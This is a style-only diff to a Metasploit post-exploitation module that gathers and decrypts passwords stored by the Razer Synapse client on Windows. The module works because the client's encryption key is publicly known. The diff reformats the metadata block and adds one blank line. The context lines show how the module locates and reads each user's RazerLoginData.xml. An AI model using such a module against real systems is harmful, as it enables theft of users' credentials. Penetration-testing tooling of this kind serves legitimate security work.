@@ -9,30 +9,31 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::File
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Windows Gather Razer Synapse Password Extraction',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Razer Synapse Password Extraction',
+        'Description' => %q{
           This module will enumerate passwords stored by the Razer Synapse
           client. The encryption key and iv is publicly known. This module
           will not only extract encrypted password but will also decrypt
           password using public key. Affects versions earlier than 1.7.15.
         },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
-          'Matt Howard "pasv" <themdhoward[at]gmail.com>', #PoC
+          'Matt Howard "pasv" <themdhoward[at]gmail.com>', # PoC
           'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
         ],
-      'References'    =>
-        [
+        'References' => [
           [ 'URL', 'http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/' ],
           [ 'URL', 'https://github.com/pasv/Testing/blob/master/Razer_decode.py' ]
         ],
-      'SessionTypes'   => [ 'meterpreter' ],
-      'Platform'      => [ 'win' ]
-    ))
+        'SessionTypes' => [ 'meterpreter' ],
+        'Platform' => [ 'win' ]
+      )
+    )
   end
 
   def is_base64?(str)
@@ -122,6 +123,7 @@ class MetasploitModule < Msf::Post
       if user['LocalAppData']
         accounts = user['LocalAppData'] + "\\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
         next if not file?(accounts)
+
         print_status("Config found for user #{user['UserName']}")
 
         contents = read_file(accounts)
